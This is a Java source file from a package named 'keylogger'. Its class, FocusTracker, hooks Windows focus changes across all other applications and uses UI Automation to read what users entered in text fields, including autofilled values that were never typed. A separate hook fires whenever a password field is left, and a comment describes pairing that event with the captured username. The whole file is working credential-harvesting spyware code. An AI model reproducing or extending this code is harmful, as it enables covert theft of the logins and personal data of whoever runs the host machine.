package keylogger;

import com.sun.jna.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.WinDef.*;
import com.sun.jna.ptr.PointerByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.util.concurrent.atomic.AtomicInteger;

/**
 * Monitors keyboard focus changes using SetWinEventHook + Windows UI Automation.
 *
 * When focus leaves a non-password edit field, fires onFieldLeft() with
 * the field's current value — including auto-filled text that was never typed.
 */
public class FocusTracker {

    public interface FieldLeftCallback {
        void onFieldLeft(String value);
    }

    public interface PasswordFieldLeftCallback {
        void onPasswordFieldLeft(String value);
    }

    // ── Windows constants ─────────────────────────────────────────────────────
    private static final int EVENT_OBJECT_FOCUS       = 0x8005;
    private static final int WINEVENT_OUTOFCONTEXT    = 0x0000;
    private static final int WINEVENT_SKIPOWNPROCESS  = 0x0002;
    private static final int WM_QUIT                  = 0x0012;
    private static final int PM_REMOVE                = 0x0001;
    private static final int COINIT_APARTMENTTHREADED = 0x2;
    private static final int CLSCTX_INPROC_SERVER     = 1;

    // ── UIA property IDs ──────────────────────────────────────────────────────
    private static final int UIA_ValueValuePropertyId  = 30045;
    private static final int UIA_IsPasswordPropertyId  = 30039;
    private static final int UIA_ControlTypePropertyId = 30003;
    private static final int UIA_EditControlTypeId     = 50004;

    // ── VARIANT type codes ────────────────────────────────────────────────────
    private static final short VT_BSTR      = 8;
    private static final short VT_BOOL      = 11;
    private static final short VT_I4        = 3;
    private static final short VARIANT_TRUE = (short) 0xFFFF; // VARIANT_BOOL true

    // ── JNA interfaces ────────────────────────────────────────────────────────

    interface User32Ex extends StdCallLibrary {
        User32Ex INSTANCE = Native.load("user32", User32Ex.class,
                W32APIOptions.DEFAULT_OPTIONS);

        Pointer SetWinEventHook(int eventMin, int eventMax,
                                Pointer hmodWinEventProc, WinEventProc pfnWinEventProc,
                                int idProcess, int idThread, int dwFlags);
        boolean UnhookWinEvent(Pointer hHook);
        boolean PeekMessage(MSG lpMsg, HWND hWnd, int min, int max, int remove);
        boolean TranslateMessage(MSG lpMsg);
        LRESULT DispatchMessage(MSG lpMsg);
        boolean PostThreadMessage(int threadId, int msg, WPARAM wParam, LPARAM lParam);
    }

    interface WinEventProc extends StdCallLibrary.StdCallCallback {
        void callback(Pointer hHook, int event, HWND hwnd, int idObject, int idChild,
                      int idThread, int time);
    }

    @Structure.FieldOrder({"hwnd", "message", "wParam", "lParam", "time", "pt"})
    public static class MSG extends Structure {
        public HWND   hwnd;
        public int    message;
        public WPARAM wParam;
        public LPARAM lParam;
        public int    time;
        public POINT  pt;
    }

    // ── GUIDs ─────────────────────────────────────────────────────────────────

    // CLSID_CUIAutomation {ff48dba4-60ef-4201-aa87-54103eef594e}
    private static Guid.GUID clsidCUIAutomation() {
        Guid.GUID g = new Guid.GUID();
        g.Data1 = (int) 0xff48dba4L;
        g.Data2 = (short) 0x60ef;
        g.Data3 = (short) 0x4201;
        g.Data4 = new byte[]{(byte)0xaa,(byte)0x87,0x54,0x10,0x3e,(byte)0xef,0x59,0x4e};
        return g;
    }

    // IID_IUIAutomation {30cbe57d-d9d0-452a-ab13-7ac5ac4825ee}
    private static Guid.GUID iidIUIAutomation() {
        Guid.GUID g = new Guid.GUID();
        g.Data1 = 0x30cbe57d;
        g.Data2 = (short) 0xd9d0;
        g.Data3 = (short) 0x452a;
        g.Data4 = new byte[]{(byte)0xab,0x13,0x7a,(byte)0xc5,(byte)0xac,0x48,0x25,(byte)0xee};
        return g;
    }

    // ── State ─────────────────────────────────────────────────────────────────

    private final FieldLeftCallback         callback;
    private final PasswordFieldLeftCallback passwordCallback;

    private volatile boolean     running;
    private          Thread      loopThread;
    private final AtomicInteger  loopThreadId = new AtomicInteger();

    private WinEventProc winEventProc; // must be kept alive to prevent GC
    private Pointer      hookHandle;
    private Pointer      pAutomation;  // IUIAutomation*
    private Pointer      prevElem;     // last focused IUIAutomationElement*

    public FocusTracker(FieldLeftCallback callback, PasswordFieldLeftCallback passwordCallback) {
        this.callback         = callback;
        this.passwordCallback = passwordCallback;
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    public void start() {
        if (running) return;
        running = true;

        loopThread = new Thread(new Runnable() {
            @Override public void run() {
                loopThreadId.set(Kernel32.INSTANCE.GetCurrentThreadId());

                // COM must be initialised on the same thread that uses it
                Ole32.INSTANCE.CoInitializeEx(null, COINIT_APARTMENTTHREADED);

                // Create the IUIAutomation COM object
                PointerByReference ppAuto = new PointerByReference();
                if (Ole32.INSTANCE.CoCreateInstance(
                        clsidCUIAutomation(), null, CLSCTX_INPROC_SERVER,
                        iidIUIAutomation(), ppAuto).intValue() == 0) {
                    pAutomation = ppAuto.getValue();
                }

                // Register the focus hook
                winEventProc = new WinEventProc() {
                    @Override public void callback(Pointer hHook, int event, HWND hwnd,
                            int idObject, int idChild, int idThread, int time) {
                        onFocusChanged();
                    }
                };
                hookHandle = User32Ex.INSTANCE.SetWinEventHook(
                        EVENT_OBJECT_FOCUS, EVENT_OBJECT_FOCUS,
                        null, winEventProc, 0, 0,
                        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);

                // Message loop — required for WINEVENT_OUTOFCONTEXT callbacks to fire
                MSG msg = new MSG();
                while (running) {
                    while (User32Ex.INSTANCE.PeekMessage(msg, null, 0, 0, PM_REMOVE)) {
                        if (msg.message == WM_QUIT) { running = false; break; }
                        User32Ex.INSTANCE.TranslateMessage(msg);
                        User32Ex.INSTANCE.DispatchMessage(msg);
                    }
                    try { Thread.sleep(10); } catch (InterruptedException e) { break; }
                }

                // Cleanup
                if (hookHandle != null)  User32Ex.INSTANCE.UnhookWinEvent(hookHandle);
                if (prevElem    != null) { comRelease(prevElem);    prevElem    = null; }
                if (pAutomation != null) { comRelease(pAutomation); pAutomation = null; }
                Ole32.INSTANCE.CoUninitialize();
            }
        }, "FocusTracker");
        loopThread.setDaemon(true);
        loopThread.start();
    }

    public void stop() {
        running = false;
        int tid = loopThreadId.get();
        if (tid != 0)
            User32Ex.INSTANCE.PostThreadMessage(tid, WM_QUIT,
                    new WPARAM(0), new LPARAM(0));
    }

    // ── Focus event ───────────────────────────────────────────────────────────

    private void onFocusChanged() {
        if (pAutomation == null) return;

        // Snapshot the newly focused element
        Pointer newElem = getFocusedElement();
        Pointer prev    = prevElem;
        prevElem = newElem;

        if (prev == null) return;

        try {
            if (isEditControl(prev)) {
                String val = readValue(prev);
                String trimmed = (val != null) ? val.trim() : "";
                if (isPasswordField(prev)) {
                    // Always fire for password fields — browsers return empty,
                    // but the caller can still use the previously captured username.
                    if (passwordCallback != null)
                        passwordCallback.onPasswordFieldLeft(trimmed);
                } else if (!trimmed.isEmpty()) {
                    callback.onFieldLeft(trimmed);
                }
            }
        } finally {
            comRelease(prev);
        }
    }

    // ── UIA vtable helpers ────────────────────────────────────────────────────

    /**
     * IUIAutomation::GetFocusedElement
     * Vtable slot 8 (IUnknown has 3, then CompareElements..GetFocusedElement at 8).
     */
    private Pointer getFocusedElement() {
        try {
            PointerByReference out = new PointerByReference();
            int hr = Function.getFunction(vtFn(pAutomation, 8))
                    .invokeInt(new Object[]{ pAutomation, out });
            return hr == 0 ? out.getValue() : null;
        } catch (Exception e) { return null; }
    }

    /**
     * IUIAutomationElement::GetCurrentPropertyValue
     * Vtable slot 10 (IUnknown 3 + SetFocus..BuildUpdatedCache = 7 more, then slot 10).
     * Returns a 16-byte VARIANT (8-byte header + 8-byte union on both 32/64-bit Windows).
     */
    private Memory getProperty(Pointer pElem, int propId) {
        try {
            Memory var = new Memory(16);
            var.clear();
            int hr = Function.getFunction(vtFn(pElem, 10))
                    .invokeInt(new Object[]{ pElem, propId, var });
            return hr == 0 ? var : null;
        } catch (Exception e) { return null; }
    }

    private String readValue(Pointer pElem) {
        Memory v = getProperty(pElem, UIA_ValueValuePropertyId);
        if (v == null || v.getShort(0) != VT_BSTR) return null;
        try {
            Pointer bstr = v.getPointer(8); // BSTR pointer at offset 8 in VARIANT
            return bstr == null ? null : bstr.getWideString(0);
        } catch (Exception e) { return null; }
    }

    private boolean isPasswordField(Pointer pElem) {
        Memory v = getProperty(pElem, UIA_IsPasswordPropertyId);
        return v != null && v.getShort(0) == VT_BOOL && v.getShort(8) == VARIANT_TRUE;
    }

    private boolean isEditControl(Pointer pElem) {
        Memory v = getProperty(pElem, UIA_ControlTypePropertyId);
        return v != null && v.getShort(0) == VT_I4 && v.getInt(8) == UIA_EditControlTypeId;
    }

    /** Read a function pointer from a COM vtable at the given slot index. */
    private Pointer vtFn(Pointer pCom, int slot) {
        return pCom.getPointer(0).getPointer((long) slot * Native.POINTER_SIZE);
    }

    /** IUnknown::Release — vtable slot 2 */
    private void comRelease(Pointer pUnk) {
        try { Function.getFunction(vtFn(pUnk, 2)).invokeInt(new Object[]{ pUnk }); }
        catch (Exception ignored) {}
    }
}
